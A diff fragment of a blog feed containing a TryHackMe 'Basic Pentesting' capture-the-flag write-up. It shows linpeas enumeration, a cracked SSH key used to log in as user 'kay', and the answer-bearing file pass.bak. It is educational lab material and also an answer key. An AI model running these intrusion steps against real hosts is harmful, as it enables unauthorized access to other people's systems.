-<h1 id="question-8---enumerate-the-machine-to-find-any-vectors-for-privilege-escalation">Question 8 - Enumerate the machine to find any vectors for privilege escalation</h1>
+<h2 id="question-8---enumerate-the-machine-to-find-any-vectors-for-privilege-escalation">Question 8 - Enumerate the machine to find any vectors for privilege escalation</h2>
 <p>No answer needed, but we can use <code class="language-plaintext highlighter-rouge">linpeas</code> to enumerate the machine.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jan@basic2:/tmp<span class="nv">$ </span>./linpeas.sh 
 linpeas v2.2.7 by carlospolop
@@ -1753,15 +1852,15 @@ Use the <span class="s2">"--show"</span> option to display all of the cracked pa
 Session completed.
 </code></pre></div></div>
 
-<h1 id="question-9---what-is-the-name-of-the-other-user-you-foundall-lower-case">Question 9 - What is the name of the other user you found(all lower case)?</h1>
+<h2 id="question-9---what-is-the-name-of-the-other-user-you-foundall-lower-case">Question 9 - What is the name of the other user you found(all lower case)?</h2>
 <p>The answer is <code class="language-plaintext highlighter-rouge">kay</code>.</p>
 
-<h1 id="question-10---if-you-have-found-another-user-what-can-you-do-with-this-information">Question 10 - If you have found another user, what can you do with this information?</h1>
+<h2 id="question-10---if-you-have-found-another-user-what-can-you-do-with-this-information">Question 10 - If you have found another user, what can you do with this information?</h2>
 <p>No answer needed.</p>
 
-<h1 id="question-11---what-is-the-final-password-you-obtain">Question 11 - What is the final password you obtain?</h1>
+<h2 id="question-11---what-is-the-final-password-you-obtain">Question 11 - What is the final password you obtain?</h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kay@10.10.131.121 <span class="nt">-i</span> kay_rsa 
 Enter passphrase <span class="k">for </span>key <span class="s1">'kay_rsa'</span>: 
 kay@basic2:~<span class="nv">$ </span><span class="nb">cat </span>pass.bak 
 </code></pre></div></div>
-<p>The answer is inside the file <code class="language-plaintext highlighter-rouge">pass.bak</code></p>]]></content><author><name>akymos</name></author><category term="ctf" /><category term="ctf" /><category term="TryHackMe" /><summary type="html"><![CDATA[Room info Name: Basic Pentesting Link: https://tryhackme.com/room/basicpentestingjt Subscription: Free Difficulty: Easy Description: This is a machine that allows you to practise web app hacking and privilege escalation]]></summary></entry></feed>
+<p>The answer is inside the file <code class="language-plaintext highlighter-rouge">pass.bak</code></p>]]></content><author><name>Akymos</name></author><category term="ctf" /><category term="ctf" /><category term="tryhackme" /><summary type="html"><![CDATA[Table of Contents]]></summary></entry></feed>
